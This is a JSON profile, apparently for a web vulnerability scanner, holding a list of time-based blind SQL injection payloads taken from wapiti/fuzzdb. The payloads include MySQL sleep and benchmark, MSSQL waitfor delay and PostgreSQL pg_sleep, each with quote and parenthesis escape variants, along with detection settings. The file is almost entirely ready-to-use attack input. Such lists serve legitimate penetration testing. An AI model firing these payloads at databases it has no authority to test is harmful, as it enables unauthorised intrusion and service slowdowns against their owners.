[{"Name":"Generic-BlindSQLi.fuzzdb","Enabled":true,"Scanner":1,"Payloads":["# from wapiti","sleep(__TIME__)#","1 or sleep(__TIME__)#","\" or sleep(__TIME__)#","\u0027 or sleep(__TIME__)#","\" or sleep(__TIME__)\u003d\"","\u0027 or sleep(__TIME__)\u003d\u0027","1) or sleep(__TIME__)#","\") or sleep(__TIME__)\u003d\"","\u0027) or sleep(__TIME__)\u003d\u0027","1)) or sleep(__TIME__)#","\")) or sleep(__TIME__)\u003d\"","\u0027)) or sleep(__TIME__)\u003d\u0027",";waitfor delay \u00270:0:__TIME__\u0027--",");waitfor delay \u00270:0:__TIME__\u0027--","\u0027;waitfor delay \u00270:0:__TIME__\u0027--","\";waitfor delay \u00270:0:__TIME__\u0027--","\u0027);waitfor delay \u00270:0:__TIME__\u0027--","\");waitfor delay \u00270:0:__TIME__\u0027--","));waitfor delay \u00270:0:__TIME__\u0027--","\u0027));waitfor delay \u00270:0:__TIME__\u0027--","\"));waitfor delay \u00270:0:__TIME__\u0027--","benchmark(10000000,MD5(1))#","1 or benchmark(10000000,MD5(1))#","\" or benchmark(10000000,MD5(1))#","\u0027 or benchmark(10000000,MD5(1))#","1) or benchmark(10000000,MD5(1))#","\") or benchmark(10000000,MD5(1))#","\u0027) or benchmark(10000000,MD5(1))#","1)) or benchmark(10000000,MD5(1))#","\")) or benchmark(10000000,MD5(1))#","\u0027)) or benchmark(10000000,MD5(1))#","pg_sleep(__TIME__)--","1 or pg_sleep(__TIME__)--","\" or pg_sleep(__TIME__)--","\u0027 or pg_sleep(__TIME__)--","1) or pg_sleep(__TIME__)--","\") or pg_sleep(__TIME__)--","\u0027) or pg_sleep(__TIME__)--","1)) or pg_sleep(__TIME__)--","\")) or pg_sleep(__TIME__)--","\u0027)) or pg_sleep(__TIME__)--"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["error","Sql Syntax"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"0","isTime":false,"iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":0,"IssueName":"Generic-BlindSQLi.fuzzdb","IssueSeverity":"Information","IssueConfidence":"Certain","IssueDetail":"Generic-BlindSQLi.fuzzdb\n\n\u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Scantype":0,"pathDiscovery":false}]